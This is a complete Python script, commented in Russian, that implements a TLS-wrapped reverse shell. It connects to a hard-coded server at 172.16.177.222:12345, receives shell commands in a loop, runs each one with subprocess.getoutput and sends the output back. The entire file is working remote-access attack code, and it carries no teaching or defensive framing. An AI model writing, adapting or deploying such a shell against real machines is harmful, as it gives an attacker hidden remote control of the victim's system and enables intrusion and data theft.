import socket
import ssl
import subprocess


def main():
    # Создание SSL контекста
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations('server_cert.pem')

    # Создание сокета и оборачивание его в SSL
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_client_socket = context.wrap_socket(client_socket, server_hostname='172.16.177.222')  # IP-адрес сервера

    # Подключение к серверу
    ssl_client_socket.connect(('172.16.177.222', 12345))

    while True:
        command = ssl_client_socket.recv(1024).decode()
        if not command:
            break

        result = subprocess.getoutput(command)
        ssl_client_socket.send(result.encode())

    ssl_client_socket.close()


if __name__ == '__main__':
    main()


